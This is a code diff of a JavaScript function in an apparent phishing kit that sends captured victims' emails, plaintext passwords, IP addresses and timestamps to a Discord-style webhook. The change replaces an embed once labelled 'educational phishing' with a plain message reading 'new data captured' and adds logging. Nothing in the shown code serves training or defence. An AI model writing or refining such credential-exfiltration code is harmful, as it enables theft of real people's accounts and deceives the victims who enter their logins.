@@ -85,30 +85,26 @@ async function sendEmailNotification(data) {
 async function sendWebhook(data) {
     try {
         const webhookPayload = {
-            content: '🔒 **Dados de Phishing Educacional Capturados**',
-            embeds: [{
-                title: 'Nova Captura de Credenciais',
-                color: 0xff0000,
-                fields: [
-                    { name: '📧 Email', value: data.email, inline: true },
-                    { name: '🔑 Senha', value: '`' + data.password + '`', inline: true },
-                    { name: '🕒 Timestamp', value: data.timestamp, inline: false },
-                    { name: '🌐 IP', value: data.ip, inline: true },
-                    { name: '🖥️ User Agent', value: data.userAgent.substring(0, 100) + '...', inline: false }
-                ],
-                footer: { text: 'Sistema de Monitoramento Educacional' }
-            }]
+            content: `🔒 **NOVOS DADOS CAPTURADOS**\n📧 Email: ${data.email}\n🔑 Senha: ||${data.password}||\n🌐 IP: ${data.ip}\n🕒 Horário: ${new Date(data.timestamp).toLocaleString('pt-BR')}`
         };
+        
+        console.log('Enviando webhook simplificado...');
         
         const response = await fetch(process.env.WEBHOOK_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+                'Content-Type': 'application/json'
+            },
             body: JSON.stringify(webhookPayload)
         });
+        
+        console.log('Resposta do webhook:', response.status);
         
         if (!response.ok) {
             throw new Error(`Webhook failed: ${response.status}`);
         }
+        
+        console.log('Webhook enviado com sucesso!');
         
     } catch (error) {
         console.error('Erro ao enviar webhook:', error);
